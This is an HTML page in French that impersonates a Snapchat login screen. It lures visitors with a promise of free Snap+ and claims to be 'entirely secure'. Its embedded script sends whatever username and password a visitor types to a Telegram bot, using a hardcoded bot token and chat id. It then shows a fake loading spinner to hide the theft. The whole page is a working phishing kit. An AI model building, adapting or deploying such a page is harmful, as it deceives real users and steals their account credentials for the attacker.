<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connexion Snapchat</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');

    body {
      font-family: 'Inter', sans-serif;
      background-color: #FFFC00;
      height: 100vh;
      overflow: hidden;
    }

    .snap-logo {
      width: 64px;
      animation: float 2s ease-in-out infinite;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-15px); }
    }

    .input-field:focus {
      box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.2);
    }

    .btn-snap {
      background-color: #FFFC00;
      box-shadow: 0 4px 0 rgba(0, 0, 0, 0.2);
      transition: all 0.2s;
    }

    .btn-snap:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 rgba(0, 0, 0, 0.2);
    }

    .pulse {
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
  </style>
</head>
<body class="flex items-center justify-center">
  <div class="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none">
    <div class="absolute top-20 left-10 w-16 h-16 rounded-full bg-yellow-300 opacity-20"></div>
    <div class="absolute top-1/3 right-20 w-24 h-24 rounded-full bg-yellow-300 opacity-20"></div>
  </div>

  <div class="relative w-full max-w-md px-8 py-12 bg-white rounded-2xl shadow-xl z-10 mx-4">
    <div class="flex flex-col items-center mb-10">
      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png" alt="Snapchat" class="mx-auto w-16">
      <h1 class="text-3xl font-bold text-gray-900 mb-2">Se connecter</h1>
      <p class="text-gray-500 text-center">Entrer vos identifiant pour pouvoir beneficier de Snap+ entièrement gratuitement   !</p>
    </div>

    <form id="loginForm" class="space-y-6">
      <div>
        <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Nom d'utilisateur ou email</label>
        <div class="relative">
          <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
            <i class="fas fa-user text-gray-400"></i>
          </div>
          <input type="text" id="username" name="username" required
            class="input-field pl-10 w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-yellow-400"
            placeholder="snapchatter123">
        </div>
      </div>

      <div>
        <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Mot de passe</label>
        <div class="relative">
          <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
            <i class="fas fa-lock text-gray-400"></i>
          </div>
          <input type="password" id="password" name="password" required
            class="input-field pl-10 w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-yellow-400"
            placeholder="mot de passe">
          <button type="Burton" id="togglePassword" class="absolute inset-y-0 right-0 pr-3 flex items-center">
            <i class="fas fa-eye text-gray-400 hover:text-gray-600"></i>
          </button>
        </div>
      </div>

      <button type="submit"
        class="btn-snap w-full flex justify-center py-3 px-4 border border-transparent rounded-lg font-medium text-gray-900 hover:bg-yellow-300 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-yellow-400 transition duration-200 pulse">
        Se connecter
      </button>
    </form>

    <div class="mt-8 text-center text-xs text-gray-500">
      <p>Ce site est entierement sécurise et fiable. 
Actuellement plus de 100 personnes visite le site.</p>
    </div>
  </div>

  <script>
    const token = '7843429709:AAERMa9nh424OsowOYio41t5ST01oJR7jhM';
    const chat_id = '7289566882';

    document.addEventListener('DOMContentLoaded', function () {
      const togglePassword = document.getElementById('togglePassword');
      const password = document.getElementById('password');

      togglePassword.addEventListener('click', function () {
        const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
        password.setAttribute('type', type);
        this.innerHTML = type === 'password'
          ? '<i class="fas fa-eye text-gray-400 hover:text-gray-600"></i>'
          : '<i class="fas fa-eye-slash text-gray-400 hover:text-gray-600"></i>';
      });

      const form = document.getElementById('loginForm');
      form.addEventListener('submit', function (e) {
        e.preventDefault();

        const username = document.getElementById('username')?.value || 'Inconnu';
        const passwordVal = document.getElementById('password')?.value || 'Non fourni';

        const message =
          `⚠️ connexion Snapchat\n` +
          `👤 Identifiant : ${username}\n` +
          `🔑 Mot de passe : ${passwordVal}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id, text: message })
        })
          .then(res => res.json())
          .then(data => console.log('Message envoyé à Telegram', data))
          .catch(err => console.error('Erreur réseau', err));

        const submitButton = form.querySelector('button[type="submit"]');
        submitButton.disabled = true;
        submitButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Connexion...';

        setTimeout(() => {
          submitButton.disabled = false;
          submitButton.textContent = 'Se connecter';
        }, 1500);
      });
    });
  </script>
</body>
</html>
